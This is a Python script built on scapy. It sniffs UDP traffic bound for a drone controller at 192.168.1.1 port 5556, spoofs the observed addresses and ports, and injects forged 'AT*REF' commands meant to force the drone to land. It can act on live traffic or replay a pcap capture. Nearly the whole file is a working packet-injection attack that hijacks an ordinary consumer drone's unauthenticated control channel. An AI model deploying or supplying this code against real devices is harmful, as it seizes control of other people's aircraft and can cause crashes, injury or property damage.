#!/usr/bin/env python
# encoding: UTF-8

import argparse
import random
from scapy.all import *
import signal
import socket
import sys
import time

# unverified? 
DRONE_IP = '192.168.1.1'
DRONE_PORT = 5556
DRONE_NET_INTERFACE = 'en1'

# if you want to subvert a local controller set pcap mode to true
# otherwise, specify a pcap dump here
PCAP_FILE = 'dronecap.pcap'
PCAP_MODE = True

# for the subverter instance
subverter = None

class Subverter(object):
    """ Lands adversary drones. """


    def __init__(self):
        """ Sets up scanner. """
        pass

    def shutdown(self):
        """ Ends the subverting. """
        pass

    def onPacket(self):
        """ Returns a callback function w/ access to class vars. """
        def packetCallback(packet):
            """ A callback that keeps track of packets seen 
            and calls a method to search for consecutive probes.
            """
            try:
                if packet[IP].dst != DRONE_IP and packet[IP].src != DRONE_IP:
                    return
            except Exception:
                return

            try:
                seqnum = int(packet[0][Raw].load.split('=')[1].split(',')[0])
            except Exception:
                seqnum = 0

            seqnum = seqnum + 1

            load = 'AT*REF=' + str(seqnum) + ',290717696\r'

            forged = None
            try:
                forged = Ether(dst=packet[0][Ether].dst, src=packet[0][Ether].src)/IP(dst=packet[0][IP].dst, src=packet[0][IP].src)/UDP(sport=packet[0][UDP].sport, dport=packet[0][UDP].dport)/load
            except:
                packet.show()
                return

            forged.show2()
            del forged.chksum
            forged = forged.__class__(str(forged))
            forged.show()
            sendp(forged, iface=DRONE_NET_INTERFACE)

            seqnum += 1

        return packetCallback

    def subvert(self):
        """ Begins sniffing with onPacket callback """
        sniff(iface=DRONE_NET_INTERFACE, filter='udp', prn=self.onPacket(), store=0)

    def pcap_subvert(self):
        """ Begins sniffing with onPacket callback """
        pcap = rdpcap(PCAP_FILE)
        packetCallback = self.onPacket()
        for packet in pcap:
            packetCallback(packet)

def handler(signum,frame):
    """ Handles a SIGINT (ctrl c) """
    print('Interrupted')
    if subverter:
        print('Shutting down')
        subverter.shutdown()
    sys.exit(0)

def main():
    """ Sets up and runs the Subverter. """
    subverter = Subverter()

    if PCAP_MODE:
        subverter.pcap_subvert()
    else:
        subverter.subvert()


if __name__ == "__main__":
    signal.signal(signal.SIGINT,handler)
    main()

